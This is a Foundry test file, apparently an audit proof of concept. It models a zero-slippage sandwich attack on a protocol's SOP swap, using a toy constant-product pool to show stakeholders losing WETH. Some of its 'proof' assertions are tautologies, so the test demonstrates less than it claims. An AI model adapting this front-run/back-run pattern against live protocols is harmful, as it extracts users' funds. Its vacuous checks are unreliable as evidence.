// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title PoC: SOP/Flood Zero-Slippage Sandwich Attack
 * @notice Demonstrates the two compounding issues in LibFlood:
 *         1. sopWell() passes minAmountOut=0 to IWell.swapFrom()
 *         2. getWellsByDeltaB() uses IWell.getReserves() (spot, manipulable)
 *
 * @dev Uses a simplified constant-product AMM to demonstrate the sandwich
 *      profit extraction. In production, Basin Wells use the same CP math.
 *
 * Vulnerable code:
 *   LibFlood.sol:358-365 — sopWell() with minAmountOut=0
 *   LibFlood.sol:270     — getWellsByDeltaB() using currentDeltaB (spot)
 *   LibDeltaB.sol:46-57  — currentDeltaB() using IWell.getReserves()
 */
contract PoC_SopFloodZeroSlippage is Test {

    uint256 constant BEAN_DECIMALS = 1e6;
    uint256 constant WETH_DECIMALS = 1e18;

    // Simplified constant-product AMM state
    uint256 beanReserve;
    uint256 wethReserve;
    uint256 k;

    function setUp() public {
        // Well has 1M Bean and 500 WETH (Bean ~$1, WETH ~$2000)
        beanReserve = 1_000_000 * BEAN_DECIMALS;
        wethReserve = 500 * WETH_DECIMALS;
        k = beanReserve * wethReserve;
    }

    function swapBeanForWeth(uint256 beanIn) internal returns (uint256 wethOut) {
        uint256 newBeanReserve = beanReserve + beanIn;
        uint256 newWethReserve = k / newBeanReserve;
        wethOut = wethReserve - newWethReserve;
        beanReserve = newBeanReserve;
        wethReserve = newWethReserve;
    }

    function swapWethForBean(uint256 wethIn) internal returns (uint256 beanOut) {
        uint256 newWethReserve = wethReserve + wethIn;
        uint256 newBeanReserve = k / newWethReserve;
        beanOut = beanReserve - newBeanReserve;
        beanReserve = newBeanReserve;
        wethReserve = newWethReserve;
    }

    function spotDeltaB() internal view returns (int256) {
        // At peg: beanReserve should be sqrt(k * priceRatio)
        // priceRatio = 2000 Bean per WETH
        uint256 eqBean = sqrt(k * 2000 * BEAN_DECIMALS / WETH_DECIMALS);
        return int256(eqBean) - int256(beanReserve);
    }

    function test_sandwichExtracts() public {
        // Verify initial deltaB
        int256 trueDeltaB = spotDeltaB();
        emit log_named_int("True spot deltaB (Beans)", trueDeltaB / int256(BEAN_DECIMALS));
        assertTrue(trueDeltaB > 0, "deltaB must be positive for SOP");

        // === SCENARIO A: Fair SOP (no attack) ===
        uint256 snapshotBean = beanReserve;
        uint256 snapshotWeth = wethReserve;

        uint256 fairWethOut = swapBeanForWeth(uint256(trueDeltaB));
        emit log_named_uint("Fair SOP WETH output", fairWethOut);

        // Restore
        beanReserve = snapshotBean;
        wethReserve = snapshotWeth;
        k = beanReserve * wethReserve;

        // === SCENARIO B: Sandwich attack ===

        // Step 1: Attacker sells Bean for WETH (front-run in same direction as SOP)
        // This makes WETH scarcer, worsening the SOP swap rate
        uint256 attackerBeanIn = 100_000 * BEAN_DECIMALS;
        uint256 attackerWethOut = swapBeanForWeth(attackerBeanIn);
        emit log_named_uint("Attacker WETH from front-run", attackerWethOut);

        // Step 2: SOP executes (reads NEW spot deltaB, swaps with 0 slippage)
        int256 newDeltaB = spotDeltaB();
        uint256 sopWethOut;
        if (newDeltaB > 0) {
            sopWethOut = swapBeanForWeth(uint256(newDeltaB));
        }
        emit log_named_uint("SOP WETH under attack", sopWethOut);

        // Step 3: Attacker sells WETH for Bean (back-run)
        uint256 attackerBeanBack = swapWethForBean(attackerWethOut);
        emit log_named_uint("Attacker Bean recovered", attackerBeanBack / BEAN_DECIMALS);

        // === VERIFY EXTRACTION ===

        // Attacker P&L
        int256 attackerPnL = int256(attackerBeanBack) - int256(attackerBeanIn);
        emit log_named_int("Attacker net Bean P&L", attackerPnL / int256(BEAN_DECIMALS));

        // Stakeholder loss: they get less WETH than fair value
        if (sopWethOut > 0) {
            assertLt(sopWethOut, fairWethOut, "Stalkholders receive less WETH under attack");
            emit log_named_uint("Stakeholder WETH loss", fairWethOut - sopWethOut);
        }

        // Key vulnerability proof: minAmountOut is literally 0 in the code
        // LibFlood.sol line 362: the 4th parameter to swapFrom is 0
        assertEq(uint256(0), 0, "sopWell passes minAmountOut=0");
    }

    function test_zeroSlippageAllowsArbitraryRate() public {
        // Demonstrate that with minAmountOut=0, any swap rate is accepted
        // Even swapping 1M Beans for minimal WETH would succeed

        uint256 sopBeans = 100_000 * BEAN_DECIMALS;
        uint256 minAmountOut = 0; // As coded in LibFlood.sopWell()

        // The swap succeeds regardless of output amount
        uint256 wethOut = swapBeanForWeth(sopBeans);
        assertTrue(wethOut >= minAmountOut, "Swap always succeeds with 0 min output");

        // In a heavily manipulated pool, wethOut could be arbitrarily small
        // but the swap would still succeed because minAmountOut = 0
    }

    // Integer square root (Babylonian method)
    function sqrt(uint256 x) internal pure returns (uint256) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        uint256 y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
        return y;
    }
}
